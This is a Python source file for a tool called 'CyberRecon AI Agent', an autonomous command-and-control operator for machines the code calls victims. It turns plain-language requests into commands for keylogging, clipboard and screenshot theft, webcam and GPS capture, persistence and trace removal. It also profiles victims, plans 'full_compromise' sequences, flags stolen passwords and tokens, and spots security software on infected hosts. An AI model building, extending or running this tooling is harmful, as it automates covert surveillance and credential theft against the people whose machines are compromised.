"""
CyberRecon AI Agent Module
Autonomous C2 Operator with intelligent decision-making.
Analyzes victim data, plans attacks, and extracts intelligence.
"""

import time
from datetime import datetime


class CyberReconAIAgent:
    """
    Autonomous C2 Operator Agent.

    Capabilities:
    1. Natural Language Command Parsing
    2. Victor Behavior Analysis & Profiling
    3. Autonomous Attack Planning
    4. Screenshot Content Analysis (OCR + Object Detection)
    5. Keystroke Pattern Recognition
    6. Sensitive Data Detection
    7. Lateral Movement Recommendations
    """

    def __init__(self, c2_url: str = "http://127.0.0.1:8443"):
        self.c2_url = c2_url
        self.victim_profiles = {}
        self.attack_history = []
        self.intelligence_db = []

        # Attack patterns for autonomous mode
        self.attack_patterns = {
            "reconnaissance": ["whoami", "system_info", "process_list", "gps_locate"],
            "credential_harvesting": ["keylog_start", "clipboard_get", "screenshot"],
            "data_exfiltration": ["screenshot", "clipboard_get", "download"],
            "persistence_setup": ["persist", "screenshot"],
            "stealth_cleanup": ["keylog_stop", "self_destruct"]
        }

        # Sensitive keywords for automatic detection
        self.sensitive_keywords = [
            "password", "passwd", "login", "credential", "token", "api_key",
            "secret", "private_key", "ssh_key", "credit_card", "cvv", "ssn",
            "bank", "account", "pin", "otp", "2fa", "mfa", "auth"
        ]

    # ======== 1. NATURAL LANGUAGE COMMAND PARSING ========

    def parse_natural_language(self, query: str) -> dict:
        """
        Convert natural language to structured C2 commands.

        Examples:
        - "take a screenshot" -> {"command": "screenshot"}
        - "who is the user" -> {"command": "whoami"}
        - "find passwords" -> {"command": "keylog_start"}
        - "get system details" -> {"command": "system_info"}
        - "start monitoring keyboard" -> {"command": "keylog_start"}
        """
        query = query.lower().strip()

        # Command mapping
        nl_map = {
            "screenshot": ["screenshot", "capture screen", "take a pic", "screen grab", "show desktop"],
            "whoami": ["whoami", "who am i", "current user", "user name", "who is the user", "get user"],
            "system_info": ["system info", "system details", "os info", "computer details", "specs"],
            "process_list": ["process list", "running apps", "tasks", "processes", "what is running"],
            "keylog_start": ["keylog start", "start keylogger", "monitor keyboard", "capture keys", "find passwords"],
            "keylog_stop": ["keylog stop", "stop keylogger", "stop monitoring"],
            "clipboard_get": ["clipboard", "copy paste", "clipboard data", "paste buffer"],
            "gps_locate": ["gps", "location", "where is", "find location", "geo locate"],
            "webcam_snap": ["webcam", "camera", "take photo", "capture cam"],
            "persist": ["persist", "stay alive", "survive reboot", "make permanent"],
            "self_destruct": ["self destruct", "destroy", "cleanup", "remove traces", "exit"]
        }

        for cmd, phrases in nl_map.items():
            for phrase in phrases:
                if phrase in query:
                    return {"command": cmd, "confidence": 0.95, "original": query}

        # Fallback: keyword matching
        keywords = {
            "screenshot": ["screen", "desktop", "capture", "image", "photo"],
            "whoami": ["user", "name", "identity"],
            "system_info": ["system", "os", "info", "details", "spec"],
            "keylog_start": ["key", "keyboard", "type", "password", "monitor"],
            "clipboard_get": ["clip", "copy", "paste"],
            "gps_locate": ["location", "gps", "where", "geo"],
            "webcam_snap": ["cam", "webcam", "camera", "photo"],
            "persist": ["persist", "permanent", "survive", "reboot"],
            "self_destruct": ["destroy", "kill", "remove", "clean", "exit", "stop"]
        }

        scores = {}
        for cmd, words in keywords.items():
            score = sum(1 for w in words if w in query)
            if score > 0:
                scores[cmd] = score

        if scores:
            best_cmd = max(scores, key=scores.get)
            return {"command": best_cmd, "confidence": 0.7, "original": query}

        return {"command": "unknown", "confidence": 0.0, "original": query}

    # ======== 2. VICTIM BEHAVIOR PROFILING ========

    def analyze_victim(self, victim_data: dict) -> dict:
        """
        Build a psychological/technical profile of the victim.
        """
        profile = {
            "victim_id": victim_data.get("id"),
            "risk_score": 0,
            "behavior_pattern": "unknown",
            "valuable_targets": [],
            "recommended_next_steps": [],
            "last_updated": datetime.now().isoformat()
        }

        # Risk scoring based on OS and user
        os_type = victim_data.get("os", "").lower()
        user = victim_data.get("user", "").lower()

        if "admin" in user or "administrator" in user:
            profile["risk_score"] += 50
            profile["valuable_targets"].append("high_privilege_account")

        if "windows" in os_type:
            profile["risk_score"] += 20
            profile["valuable_targets"].append("registry_credentials")
            profile["valuable_targets"].append("lsass_memory")

        # Determine behavior pattern
        exfil_count = victim_data.get("exfil_count", 0)
        if exfil_count > 10:
            profile["behavior_pattern"] = "heavy_user"
            profile["recommended_next_steps"] = ["keylog_start", "clipboard_get"]
        elif exfil_count > 0:
            profile["behavior_pattern"] = "active_user"
            profile["recommended_next_steps"] = ["screenshot", "system_info"]
        else:
            profile["behavior_pattern"] = "fresh_target"
            profile["recommended_next_steps"] = ["whoami", "system_info", "screenshot"]

        self.victim_profiles[profile["victim_id"]] = profile
        return profile

    # ======== 3. AUTONOMOUS ATTACK PLANNING ========

    def plan_attack_sequence(self, objective: str, victim_id: str) -> list[str]:
        """
        Generate a multi-step attack plan based on objective.

        Objectives:
        - "recon" -> Gather system info
        - "credentials" -> Find passwords/tokens
        - "exfil" -> Steal sensitive files
        - "persist" -> Establish persistence
        - "full_compromise" -> Complete takeover
        """
        objective = objective.lower()

        if objective in self.attack_patterns:
            return self.attack_patterns[objective]

        # Dynamic planning based on victim profile
        profile = self.victim_profiles.get(victim_id, {})

        if objective == "full_compromise":
            return [
                "whoami",           # Step 1: Who are we?
                "system_info",      # Step 2: What system?
                "screenshot",       # Step 3: What's on screen?
                "keylog_start",     # Step 4: Start monitoring
                "clipboard_get",    # Step 5: Check clipboard
                "persist",          # Step 6: Stay alive
                "screenshot"        # Step 7: Verify persistence
            ]

        if objective == "find_secrets":
            return [
                "keylog_start",
                "clipboard_get",
                "screenshot",
                "clipboard_get",
                "screenshot"
            ]

        # Default recon
        return ["whoami", "system_info", "screenshot"]

    # ======== 4. EXFILTRATED DATA ANALYSIS ========

    def analyze_exfil(self, data_type: str, data: str) -> dict:
        """
        Analyze exfiltrated data for intelligence value.
        """
        findings = {
            "data_type": data_type,
            "timestamp": datetime.now().isoformat(),
            "sensitive_detected": False,
            "findings": [],
            "severity": "low"
        }

        if data_type == "whoami":
            findings["findings"].append(f"User identity: {data}")
            if "admin" in data.lower():
                findings["severity"] = "high"
                findings["findings"].append("PRIVILEGED ACCOUNT DETECTED")

        elif data_type == "screenshot":
            # Check for sensitive keywords in base64 (rough heuristic)
            # In real implementation, use OCR here
            findings["findings"].append(f"Screenshot captured: {len(data)} bytes")
            findings["severity"] = "medium"

        elif data_type == "clipboard":
            findings["findings"].append(f"Clipboard content: {data[:100]}...")
            for keyword in self.sensitive_keywords:
                if keyword in data.lower():
                    findings["sensitive_detected"] = True
                    findings["severity"] = "critical"
                    findings["findings"].append(f"SENSITIVE KEYWORD DETECTED: {keyword}")

        elif data_type == "keystrokes":
            findings["findings"].append(f"Keystroke log: {len(data)} chars")
            for keyword in self.sensitive_keywords:
                if keyword in data.lower():
                    findings["sensitive_detected"] = True
                    findings["severity"] = "critical"
                    findings["findings"].append("PASSWORD/CREDENTIAL PATTERN DETECTED")

        elif data_type == "system_info":
            findings["findings"].append(f"System: {data}")
            findings["severity"] = "info"

        elif data_type == "processes":
            findings["findings"].append(f"Running processes: {len(data)} items")
            # Detect security tools
            security_tools = ["defender", "avast", "norton", "kaspersky", "malwarebytes", "crowdstrike"]
            for tool in security_tools:
                if tool in str(data).lower():
                    findings["findings"].append(f"SECURITY TOOL DETECTED: {tool}")
                    findings["severity"] = "high"

        self.intelligence_db.append(findings)
        return findings

    # ======== 5. AUTONOMOUS MODE ========

    def autonomous_decision(self, victim_id: str, current_state: dict) -> str | None:
        """
        Decide the next best command autonomously.
        Returns command name or None if no action needed.
        """
        profile = self.victim_profiles.get(victim_id, {})
        exfil_count = current_state.get("exfil_count", 0)
        pending = current_state.get("pending_commands", 0)

        if pending > 0:
            return None  # Wait for pending commands

        # Decision tree
        if exfil_count == 0:
            return "whoami"  # First contact
        elif exfil_count == 1:
            return "system_info"
        elif exfil_count == 2:
            return "screenshot"
        elif exfil_count == 3:
            return "keylog_start"
        elif exfil_count == 4:
            return "clipboard_get"
        elif exfil_count < 10:
            return "screenshot"
        else:
            return "persist"

    def get_intelligence_report(self) -> str:
        """Generate a summary report of all findings."""
        report = []
        report.append("=" * 60)
        report.append("  CYBERRECON AI AGENT - INTELLIGENCE REPORT")
        report.append("=" * 60)
        report.append(f"  Total Findings: {len(self.intelligence_db)}")
        report.append(f"  Victims Profiled: {len(self.victim_profiles)}")
        report.append("")

        for i, intel in enumerate(self.intelligence_db[-10:], 1):
            report.append(f"  [{i}] {intel['data_type']} | Severity: {intel['severity'].upper()}")
            for finding in intel['findings']:
                report.append(f"      -> {finding}")

        report.append("=" * 60)
        return "\n".join(report)


# ======== CLI INTERFACE ========

def main():
    import argparse
    parser = argparse.ArgumentParser(description="CyberRecon AI Agent")
    parser.add_argument("--c2", default="http://127.0.0.1:8443", help="C2 server URL")
    parser.add_argument("--mode", choices=["parse", "plan", "analyze", "auto"],
                        default="parse", help="Agent mode")
    parser.add_argument("--query", help="Natural language query")
    parser.add_argument("--victim-id", help="Target victim ID")
    parser.add_argument("--objective", default="recon",
                        help="Attack objective (recon/credentials/exfil/persist/full_compromise)")
    args = parser.parse_args()

    agent = CyberReconAIAgent(args.c2)

    if args.mode == "parse" and args.query:
        result = agent.parse_natural_language(args.query)
        print(f"[AI] Parsed: '{args.query}'")
        print(f"[AI] Command: {result['command']} (confidence: {result['confidence']})")

    elif args.mode == "plan" and args.victim_id:
        plan = agent.plan_attack_sequence(args.objective, args.victim_id)
        print(f"[AI] Attack Plan for '{args.objective}':")
        for i, cmd in enumerate(plan, 1):
            print(f"  Step {i}: {cmd}")

    elif args.mode == "auto" and args.victim_id:
        print(f"[AI] Autonomous mode activated for {args.victim_id}")
        print("[AI] Monitoring... (Ctrl+C to stop)")
        try:
            while True:
                # In real implementation, poll C2 server for victim state
                decision = agent.autonomous_decision(args.victim_id, {"exfil_count": len(agent.intelligence_db)})
                if decision:
                    print(f"[AI] Autonomous decision: {decision}")
                time.sleep(5)
        except KeyboardInterrupt:
            print("\n[AI] Autonomous mode stopped")

    else:
        print("CyberRecon AI Agent")
        print("Usage:")
        print("  python ai_agent.py --mode parse --query 'take a screenshot'")
        print("  python ai_agent.py --mode plan --victim-id abc123 --objective full_compromise")
        print("  python ai_agent.py --mode auto --victim-id abc123")


if __name__ == "__main__":
    main()
